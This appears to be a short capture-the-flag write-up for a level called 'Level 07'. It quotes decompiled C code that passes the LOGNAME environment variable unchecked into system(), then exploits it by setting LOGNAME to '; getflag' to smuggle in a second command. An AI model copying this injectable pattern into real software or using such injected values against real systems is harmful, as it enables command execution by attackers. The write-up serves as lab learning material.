# Level 07

We can decompile the file using [dogbotl](https://dogbolt.org) and observe this line.
```c
logName = getenv("LOGNAME");
asprintf(&cmd,"/bin/echo %s ", logName);
return system(cmd);
```
Here we are making a command with `/bin/echo` and the content of the environnement variable LOGNAME and then sending it to system. 


We can exploit this by passing multiple commands to system.
```sh
$ LOGNAME="; getflag" ./level07 
```